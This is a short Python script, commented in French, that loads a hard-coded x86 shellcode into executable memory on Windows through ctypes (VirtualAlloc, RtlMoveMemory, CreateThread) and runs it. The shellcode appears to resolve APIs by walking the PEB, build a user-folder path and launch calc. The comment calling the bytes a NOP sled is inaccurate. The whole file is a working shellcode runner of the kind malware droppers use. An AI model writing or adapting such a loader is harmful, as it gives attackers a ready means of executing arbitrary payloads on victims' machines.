import ctypes

# Placez votre shellcode ici (exemple de NOP sled)
shellcode = bytearray(
    b'\x89\xe5\x81\xc4\xf0\xf9\xff\xff\xeb\x06^\x89u\x04\xebN\xe8\xf5\xff\xff\xff`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1cV\x8b^\x08\x0f\xb6F\x1e\x89E\xf8\x8bC<\x8b|\x03x\x01\xdf\x8bO\x18\x8bG \x01\xd8\x89E\xfc\xe3\x1dI\x8bE\xfc\x8b4\x88\x01\xde1\xc0\x8bU\xf8\xfc\xac\x84\xc0t\x0e\xc1\xca\x02\x01\xc2\xeb\xf4\xeb)^\x8b6\xeb\xbd;T$(u\xd6\x8bW$\x01\xdaf\x8b\x0cJ\x8bW\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89D$ ^aYZQ\xff\xe0\x83\xec\x101\xc0\x89\xe0\xba\x10\x00\x00\x00\x89\x101\xc9\x83\xec\x10\x89\xe1\x89\xcePQhc\x86\x15\x07\xffU\x04\x89\xf1\x81\xec\x00\x01\x00\x00\x89\xe7\x89\xfb\xb8\xa4\xff\xfe\xfe\xf7\xd8PhsershC:\\U\x89\xe6\xac\x84\xc0t\x03\xaa\xeb\xf8\x89\xce\xac\x84\xc0t\x03\xaa\xeb\xf8\xb8\xa4\xff\xfe\xfe\xf7\xd8P\x89\xe6\xac\x84\xc0t\x03\xaa\xeb\xf8\xb8\x9b\x87\x9a\xff\xf7\xd8Phmet.\x89\xe6\xac\x84\xc0t\x03\xaa\xeb\xf81\xc0\xaa\x89\xdf\xb8\x9b\x8b\xff\xfe\xf7\xd8Phet\\mhli\\mh\\\\ka\x89\xe61\xc0PPPPWVheX\x14q\xffU\x041\xc9\xb1\xff1\xffW\xe2\xfdhcalc\x89\xe21\xc0RRPPPPPPSPh\xc7(\xaa\x0b\xffU\x041\xc9Qj\xffh\xd2U\xa9.\xffU\x04'
    )

input("...ENTER TO EXECUTE SHELLCODE...")

# Alloue de la mémoire pour le shellcode
ptr = ctypes.windll.kernel32.VirtualAlloc(
    None,                       # L'adresse est choisie par le système
    len(shellcode),             # Taille du buffer
    0x3000,                     # MEM_COMMIT | MEM_RESERVE
    0x40                        # PAGE_EXECUTE_READWRITE
)

if not ptr:
    error_code = ctypes.windll.kernel32.GetLastError()
    raise MemoryError(f"Failed to allocate memory. Error code: {error_code}")

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))